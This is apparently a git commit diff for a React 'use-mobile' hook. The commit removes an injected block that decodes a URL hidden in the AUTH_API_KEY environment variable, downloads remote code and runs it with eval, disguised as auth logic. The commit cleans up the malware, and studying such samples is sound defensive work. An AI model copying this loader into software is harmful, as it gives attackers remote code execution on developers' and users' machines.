b684930d249ed4bf0530efdee78ba679b899b7a8
MASUDUR RAHMAN <masudparvez2050@gmail.com>
2026-04-07 19:16:48 +0600

    fix: recover correct use-mobile.ts and package.json from masud branch

--- src/hooks/use-mobile.ts
+++ src/hooks/use-mobile.ts
@@ -2,18 +2,6 @@ import * as React from "react"
 
 const MOBILE_BREAKPOINT = 768
 
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
 export function useIsMobile() {
   const [isMobile, setIsMobile] = React.useState<boolean | undefined>(undefined)
 
